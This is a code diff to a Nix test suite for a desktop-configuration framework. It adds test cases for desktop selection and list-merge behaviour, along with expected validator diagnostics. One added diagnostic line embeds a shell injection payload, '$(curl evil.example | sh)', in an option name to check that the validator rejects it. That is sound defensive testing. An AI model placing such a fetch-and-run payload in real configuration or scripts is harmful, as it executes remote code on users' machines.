@@ -394,8 +394,13 @@
         # record the filename so "you selected two desktops" can name both.
         #
         # `mkNebelhaus` passes its `desktop` argument through here; a consumer
-        # composing by hand uses it directly:
-        #   extraModules = [ (haus.lib.desktop ./their-desktop.nix) ];
+        # composing by hand uses it directly — and passes `desktop = null`
+        # alongside, or the builder's own default is the second desktop:
+        #   mkNebelhaus {
+        #     …
+        #     desktop = null;
+        #     extraModules = [ (haus.lib.desktop ./their-desktop.nix) ];
+        #   }
         desktop =
           path:
           assert checkDesktop path;
@@ -1958,12 +1963,18 @@
             "scale=${toString cfg.haus.ui.scale}"
             + " sill=${if cfg.haus.sill.enable then "yes" else "no"}"
             + " internal=${toString (cfg.haus.displays.internal.uiScale or "(unset)")}"
+            + " list=${
+               if cfg.haus.pounce.autoQuit.exclude == null then
+                 "(unset)"
+               else
+                 builtins.concatStringsSep "+" cfg.haus.pounce.autoQuit.exclude
+             }"
             + " desktop=${desktopSelection cfg}";
           desktopRows = {
             # No `desktop` argument at all: every existing consumer's call, which
             # has always meant "the nebelhaus machine" and now says so.
             builder-default = desktopConfig { };
-            # One desktop, through the full builder. Its three values have to
+            # One desktop, through the full builder. Every value it sets has to
             # reach the evaluated system.
             one-desktop = desktopConfig { desktop = desktopFixture "valid-sample.nix"; };
             # The same desktop, plus a host that disagrees — with a PLAIN
@@ -1974,8 +1985,25 @@
               desktop = desktopFixture "valid-sample.nix";
               extraModules = [ { haus.ui.scale = 1.5; } ];
             };
+            # A LIST the host also names. Lists normally concatenate, and this
+            # seam deliberately makes them replace instead (modules/lib/desktop.nix's
+            # `prioritize` says why): `list=from-host` alone is the claim, and
+            # the row is here so step 4 cannot move a real list into a desktop
+            # and discover the semantics afterwards.
+            list-override = desktopConfig {
+              desktop = desktopFixture "valid-sample.nix";
+              extraModules = [ { haus.pounce.autoQuit.exclude = [ "from-host" ]; } ];
+            };
+            # The OTHER way to select one: by hand, through `extraModules`,
+            # which is what a consumer composing their own does. `desktop = null`
+            # is the half that is easy to miss — without it the builder's own
+            # default is the second desktop.
+            by-hand = desktopConfig {
+              desktop = null;
+              extraModules = [ (riceLib.desktop (desktopFixture "valid-other.nix")) ];
+            };
             # No desktop at all. The values fall back to what the rooms
-            # themselves default to, which is what proves the row above was the
+            # themselves default to, which is what proves the rows above were the
             # desktop's doing.
             no-desktop = desktopConfig { desktop = null; };
           };
@@ -1983,10 +2011,12 @@
             map (name: "${name} ${desktopReadback desktopRows.${name}}") (builtins.attrNames desktopRows)
           );
           expectedDesktopTable = ''
-            builder-default scale=1.000000 sill=yes internal=(unset) desktop=desktops/nebelhaus.nix
-            host-override scale=1.500000 sill=no internal=larger-text desktop=test/desktops/valid-sample.nix
-            no-desktop scale=1.000000 sill=yes internal=(unset) desktop=(none)
-            one-desktop scale=1.350000 sill=no internal=larger-text desktop=test/desktops/valid-sample.nix
+            builder-default scale=1.000000 sill=yes internal=(unset) list=(unset) desktop=desktops/nebelhaus.nix
+            by-hand scale=1.100000 sill=yes internal=(unset) list=(unset) desktop=test/desktops/valid-other.nix
+            host-override scale=1.500000 sill=no internal=larger-text list=from-desktop-a+from-desktop-b desktop=test/desktops/valid-sample.nix
+            list-override scale=1.350000 sill=no internal=larger-text list=from-host desktop=test/desktops/valid-sample.nix
+            no-desktop scale=1.000000 sill=yes internal=(unset) list=(unset) desktop=(none)
+            one-desktop scale=1.350000 sill=no internal=larger-text list=from-desktop-a+from-desktop-b desktop=test/desktops/valid-sample.nix
           '';
 
           # The OTHER entry point, and the one this step could most easily have
@@ -2013,9 +2043,22 @@
               + "  test/desktops/valid-sample.nix\n"
               + "A host runs exactly one. Whole desktops do not stack — pick the one that "
               + "answers what this Mac should feel like, and say the rest in your host file, "
-              + "which wins over the desktop by plain assignment."
+              + "which wins over the desktop by plain assignment. To select one through "
+              + "`extraModules` instead of the builder's own `desktop` argument, pass "
+              + "`desktop = null` alongside it."
             )
           ];
+
+          # Repeating the same file is still one desktop. `lib.unique` in the
+          # assertion seam makes this harmless rather than reporting the same
+          # source twice as if two different desktops had been composed.
+          desktopSameAssertions = map (a: desktopHere a.message) (
+            builtins.filter (a: !a.assertion)
+              (desktopConfig {
+                desktop = desktopFixture "valid-sample.nix";
+                extraModules = [ (riceLib.desktop (desktopFixture "valid-sample.nix")) ];
+              }).assertions
+          );
 
           # Every way a file fails to be a desktop, with the diagnostic it
           # produces. One fixture per rule (test/desktops/README.md); the list is
@@ -2031,8 +2074,10 @@
             test/desktops/dynamic-host-only.nix: haus.roster.<name>.package is host-only — it belongs to a person or a machine, so a shared desktop may not set it
             test/desktops/dynamic-unknown.nix: haus.roster.<name>.postInstall is not a haus option
             test/desktops/extra-key.nix: may not set `environment.*` — installing something is a room's job, and `haus.roster` is how a desktop asks for one
+            test/desktops/file-attr.nix: may not claim another file's name
             test/desktops/function.nix: is a function, so it is not a desktop. A desktop takes no arguments — no pkgs, no lib, no config — and evaluates to { haus = { … }; }. Something that genuinely needs pkgs is a room, with the trust that implies.
             test/desktops/group-not-option.nix: haus.theme is a group of options, not an option — name one of the settings under it
+            test/desktops/home-manager.nix: may not set `home-manager.*` — a desktop configures rooms, and rooms configure home
             test/desktops/host-only-command.nix: haus.keys.leaderExtras.*.command is host-only — it belongs to a person or a machine, so a shared desktop may not set it
             test/desktops/host-only-hardware.nix: haus.displays.37D8832A-2D66-02CA-B9F7-8F30A301B230 names a physical display, which is a fact about one machine — a desktop may only use the `internal` and `main` selectors
             test/desktops/host-only-identity.nix: haus.git.email is host-only — it belongs to a person or a machine, so a shared desktop may not set it
@@ -2045,6 +2090,11 @@
             test/desktops/internal-wiring.nix: haus._contrib is internal wiring between rooms, not a setting a desktop may write
             test/desktops/legacy-namespace.nix: spells the namespace the pre-rename way; a desktop is new enough to have no legacy spelling — write `haus`
             test/desktops/module-internals.nix: may not set module-system internals
+            test/desktops/nixpkgs.nix: may not set `nixpkgs.*`
+            test/desktops/non-attrset.nix: does not evaluate to a set of settings — a desktop is { haus = { … }; }
+            test/desktops/priority-instruction.nix: haus.ui.scale may not carry a merge or priority instruction — a desktop states values, and the host is what outranks them
+            test/desktops/shell-in-free-key.nix: haus.sill.media.icons.Music"; $(curl evil.example | sh); " may not contain quotes, backslashes, `$`, backticks or newlines
+            test/desktops/stray-key.nix: sets `launchd` outside `haus`, and a desktop may set nothing else
             test/desktops/unknown-option.nix: haus.theme.accentColour is not a haus option
           '';
 
@@ -2239,6 +2289,11 @@
               pkgs.writeText "expected" (builtins.concatStringsSep "\n" expectedDesktopTwoAssertions + "\n")
             } \
                     ${pkgs.writeText "actual" (builtins.concatStringsSep "\n" desktopTwoAssertions + "\n")}
+
+            ${nixpkgs.lib.optionalString (desktopSameAssertions != [ ]) ''
+              echo 'selecting the same desktop file twice was treated as two desktops:' >&2
+              printf '%s\n' ${nixpkgs.lib.escapeShellArgs desktopSameAssertions} >&2
+              exit 1''}
 
             diff -u ${pkgs.writeText "expected" expectedDesktopDiagnostics} \
                     ${pkgs.writeText "actual" (desktopDiagnostics + "\n")}
